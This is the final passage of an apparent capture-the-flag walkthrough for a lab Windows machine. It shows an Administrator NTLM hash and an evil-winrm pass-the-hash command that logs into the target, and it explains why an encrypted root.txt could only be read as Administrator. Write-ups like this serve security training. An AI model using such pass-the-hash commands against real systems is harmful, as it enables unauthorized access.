This command took quite a lot of time, but we eventually managed to get the Administrator hash -- `184fb5e5178480be64824d4cd53b99ee`, which we used to authenticate to the machine using the following command:

```bat
evil-winrm -u Administrator -H "184fb5e5178480be64824d4cd53b99ee" -i 10.10.10.192
```

If you did end up using a different method to authenticate to the machine which elevates your token to SYSTEM, e.g. using psexec, you would not have been able to read the `root.txt` file because it was encrypted. If you recall, the notes file stated the following: `PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)`, which ensured that only the `Administrator` account would be able to retrieve the contents of the file. 

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.